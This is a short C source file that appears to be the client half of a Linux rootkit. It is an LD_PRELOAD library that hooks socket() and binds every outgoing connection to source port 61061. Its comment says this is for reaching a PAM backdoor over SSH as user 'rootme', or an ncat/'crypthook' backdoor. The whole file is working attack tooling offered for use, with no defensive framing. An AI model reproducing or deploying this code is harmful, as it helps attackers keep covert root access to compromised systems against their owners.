/* 
 * You only need this if you're connecting via SSH to the PAM backdoor 
 * LD_PRELOAD=./client.so ssh rootme@blah.blah
 * Otherwise set it in ncat if you're using plain text accept
 * or crypthook backdoor
 */

#define _GNU_SOURCE

#include <sys/socket.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <netinet/in.h>

#define PORT 61061

static int (*old_socket)(int domain, int type, int protocol);

int socket(int domain, int type, int protocol) {
	int fd;
	struct sockaddr_in src;

	if (!old_socket)
		old_socket = dlsym(RTLD_NEXT,"socket");

	fd = old_socket(domain,type,protocol);
	
	if (fd == -1)
		return fd;

	src.sin_family = AF_INET;
	src.sin_addr.s_addr = INADDR_ANY;
	src.sin_port = htons(PORT);
	bind(fd, (struct sockaddr *) &src, sizeof(src));

	return fd;
}

